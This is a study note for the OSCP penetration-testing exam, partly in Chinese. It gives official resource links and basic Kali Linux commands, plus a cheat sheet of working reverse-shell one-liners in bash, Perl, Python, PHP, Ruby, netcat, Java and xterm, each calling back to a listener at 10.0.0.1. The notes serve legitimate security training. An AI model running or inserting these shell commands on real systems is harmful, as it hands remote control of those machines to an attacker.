# OSCP learning

## 官方

* [官方考试说明](https://www.lshack.cn/wp-content/uploads/2019/02/lshack.cn_2019-02-12_09-29-54.pdf)
* [PWK FAQ](https://support.offensive-security.com/#!pwk-general-questions.md)
* [OSCP exam FAQ](https://support.offensive-security.com/oscp-faq/)
* [IRC](https://www.offensive-security.com/offsec-irc-guide/)

## 考试报名

## 资料链接

## cheetsheet 

### 反弹 shell

#### Bash 

Some versions of bash can send you a reverse shell (this was tested on Ubuntu 10.10):

`bash -i >& /dev/tcp/10.0.0.1/8080 0>&1`

#### PERL 

```perl
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

#### Python(2.7)

```python 
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

#### PHP

`php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'`

#### Ruby

`ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`

#### Netcat

`nc -e /bin/sh 10.0.0.1 1234`

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f`

#### Java

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

#### xterm 

`xterm -display 10.0.0.1:1`




### Kali Linux

* 设置目标机器 IP 地址为系统变量
`export ip=192.168.1.0`
* 定位文件
`locate sbd.exe`
* 在 `$PATH` 环境变量里查找目录 `which sbd`
* 展示活动互联网链接 `netstat -lntp`
* 修改密码 `paswd`
* 验证服务是否正在运行并监听 `netstat -antp |grep apache`
* 启动服务 `systemctl start ssh`
* 让服务在启动的时候开启 `systemctl enable ssh`
* 停止服务 `systemctl stop ssh`
* 解压 gz 文件 `gunzip access.log.gz`
* 解压 tar.gz 文件 `tar -xzvf file.tar.gz`
* 检索命令历史 `history |grep phrase_to_search_for`
* 下载网页 `wget https://www.baidu.com`
* 打开网页 `curl https://wwww.baidu.com`
* 字符串操作
  * 统计文件中行数
  `wc -l index.html`
  * 获取文件的开头或者结尾
  `head index.html`
  `tail index.html`
  * 提取包含某个字符串的所有行
  `grep "href=" index.html`
  
